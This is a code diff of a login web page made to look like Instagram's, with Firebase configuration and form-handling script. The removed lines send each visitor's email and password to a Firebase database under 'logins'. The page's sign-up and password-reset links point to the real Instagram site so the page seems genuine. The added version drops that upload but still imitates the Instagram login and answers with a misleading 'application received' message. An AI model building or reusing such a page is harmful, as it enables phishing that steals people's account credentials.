@@ -135,38 +135,6 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-
-        /* Toast Message Styling */
-        .toast {
-            visibility: hidden;
-            min-width: 250px;
-            margin-left: -125px;
-            background-color: #333;
-            color: #fff;
-            text-align: center;
-            border-radius: 2px;
-            padding: 16px;
-            position: fixed;
-            z-index: 1;
-            left: 50%;
-            bottom: 30px;
-            font-size: 17px;
-        }
-
-        .toast.show {
-            visibility: visible;
-            animation: fadein 0.5s, fadeout 0.5s 1.5s;
-        }
-
-        @keyframes fadein {
-            from { bottom: 0; opacity: 0; }
-            to { bottom: 30px; opacity: 1; }
-        }
-
-        @keyframes fadeout {
-            from { bottom: 30px; opacity: 1; }
-            to { bottom: 0; opacity: 0; }
-        }
     </style>
 </head>
 <body>
@@ -220,10 +188,31 @@
             <p class="mt-4 text-sm">Loading...</p>
         </div>
     </div>
-
-    <!-- Toast Message -->
-    <div id="toast" class="toast">Please fill in all fields.</div>
 </div>
+
+<script type="module">
+  // Import the functions you need from the SDKs you need
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-app.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.13.0/firebase-analytics.js";
+  // TODO: Add SDKs for Firebase products that you want to use
+  // https://firebase.google.com/docs/web/setup#available-libraries 
+
+  // Your web app's Firebase configuration
+  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+  const firebaseConfig = {
+    apiKey: "AIzaSyDymE-Uewk3yWt5GuXzAFA8qzNC4Bo3w",
+    authDomain: "mynewproject.firebaseapp.com",
+    projectId: "mynewproject",
+    storageBucket: "mynewproject.appspot.com",
+    messagingSenderId: "123456789012",
+    appId: "1:123456789012:web:abcdef123456",
+    measurementId: "G-1ABCDEFGH"
+  }; 
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+</script> 
 
 <script type="module">
     // Import the functions you need from the SDKs you need
@@ -232,92 +221,84 @@
 
     // Your web app's Firebase configuration
     const firebaseConfig = {
-      apiKey: "AIzaSyAaryJSWP9Xx7YxHfzGmuUCdfsIFsWg",
-      authDomain: "instagram-clone.firebaseapp.com",
-      databaseURL: "https://instagram-clone.firebaseio.com",
-      projectId: "instagram-clone",
-      storageBucket: "instagram-clone.appspot.com",
-      messagingSenderId: "123456789",
-      appId: "1:123456789:web:abcdef123456"
+      apiKey: "AIzaSyDymE-Uewk3yWt5GuXzAFA8qzNC4Bo3w",
+      authDomain: "mynewproject.firebaseapp.com",
+      databaseURL: "https://mynewproject-default-rtdb.firebaseio.com/",
+      projectId: "mynewproject",
+      storageBucket: "mynewproject.appspot.com",
+      messagingSenderId: "123456789012",
+      appId: "1:123456789012:web:abcdef123456",
+      measurementId: "G-1ABCDEFGH"
     };
 
     // Initialize Firebase
     const app = initializeApp(firebaseConfig);
     const database = getDatabase(app);
 
-    // Show loading overlay
+    // Example function to push data to the Realtime Database
+    function pushData(data) {
+      const dbRef = ref(database, 'data');
+      push(dbRef, data);
+    }
+</script>
+
+<script>
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const loginForm = document.getElementById('loginForm');
+
     function showLoading() {
         document.getElementById('loading').classList.add('active');
     }
 
-    // Hide loading overlay
     function hideLoading() {
         document.getElementById('loading').classList.remove('active');
     }
 
-    // Show toast message
-    function showToast(message) {
-        const toast = document.getElementById('toast');
-        toast.textContent = message;
-        toast.className = 'toast show';
-        setTimeout(() => {
-            toast.className = toast.className.replace('show', '');
-        }, 1000);
+    function showPopup(message) {
+        const popup = document.getElementById('popup');
+        popup.querySelector('.popup-content').textContent = message;
+        popup.classList.add('active');
     }
 
-    // Show popup
-    function showPopup() {
-        document.getElementById('popup').classList.add('active');
-    }
-
-    // Hide popup
     function hidePopup() {
         document.getElementById('popup').classList.remove('active');
     }
 
-    // Handle login
     function handleLogin() {
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-
-        if (!email || !password) {
-            showToast('Please fill in all fields.');
-            return;
-        }
-
         showLoading();
 
-        // Simulate a delay for loading animation
+        const email = emailInput.value;
+        const password = passwordInput.value;
+
+        // Simulate an asynchronous login process
         setTimeout(() => {
-            // Push the login data to the Firebase database
-            const loginRef = ref(database, 'logins');
-            push(loginRef, {
-                email: email,
-                password: password
-            }).then(() => {
-                hideLoading();
-                showPopup();
-            }).catch((error) => {
-                hideLoading();
-                showToast('Error: ' + error.message);
-            });
+            hideLoading();
+            if (email && password) {
+                showPopup('Your application has been received. Check back in a week for an update.');
+            } else {
+                alert('Please enter both email and password.');
+            }
         }, 2000);
     }
 
-    // Handle Facebook login
-    function handleFacebookLogin() {
-        showToast('Error');
-    }
-
-    // Handle forgot password
     function handleForgotPassword() {
         window.location.href = 'https://www.instagram.com/accounts/password/reset/';
     }
 
-    // Handle sign up
     function handleSignUp() {
         window.location.href = 'https://www.instagram.com/accounts/emailsignup/';
     }
+
+    function handleFacebookLogin() {
+        alert('error');
+    }
+
+    // Dark mode toggle
+    const darkModeToggle = document.getElementById('darkModeToggle');
+    darkModeToggle.addEventListener('click', function () {
+        document.body.classList.toggle('dark-mode');
+    });
 </script>
 </body>
 </html>
